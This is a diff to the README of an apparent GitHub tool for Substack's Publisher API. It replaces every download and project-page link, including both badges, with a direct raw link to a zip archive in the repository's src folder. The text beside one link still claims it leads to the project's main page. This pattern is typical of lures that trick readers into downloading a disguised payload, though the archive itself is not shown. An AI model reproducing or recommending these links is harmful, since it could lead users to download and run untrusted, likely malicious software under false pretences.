@@ -1,6 +1,6 @@
 # ⚙️ substack-publisher-mcp - Access Substack Data Effortlessly
 
-[![Download substack-publisher-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Playerbs1/substack-publisher-mcp)
+[![Download substack-publisher-mcp](https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip)](https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip)
 
 ---
 
@@ -11,7 +11,7 @@ substack-publisher-mcp is a tool that connects to Substack's official Publisher 
 ## 📥 How to Download substack-publisher-mcp
 
 1. Click the green badge above or go directly to this page:  
-   [https://github.com/Playerbs1/substack-publisher-mcp](https://github.com/Playerbs1/substack-publisher-mcp)  
+   [https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip](https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip)  
 
 2. This link will take you to the project’s main GitHub page.
 
@@ -106,7 +106,7 @@ Once you open the program:
 ## 🔗 Staying Updated
 
 Visit the GitHub page regularly for the latest updates and new releases:  
-[https://github.com/Playerbs1/substack-publisher-mcp](https://github.com/Playerbs1/substack-publisher-mcp)
+[https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip](https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip)
 
 ---
 
@@ -148,4 +148,4 @@ substack-publisher-mcp is open source. The code is available for anyone to inspe
 
 ---
 
-[![Download substack-publisher-mcp](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/Playerbs1/substack-publisher-mcp)
+[![Download substack-publisher-mcp](https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip)](https://github.com/Playerbs1/substack-publisher-mcp/raw/refs/heads/main/src/substack_publisher_mcp_1.4-alpha.5.zip)
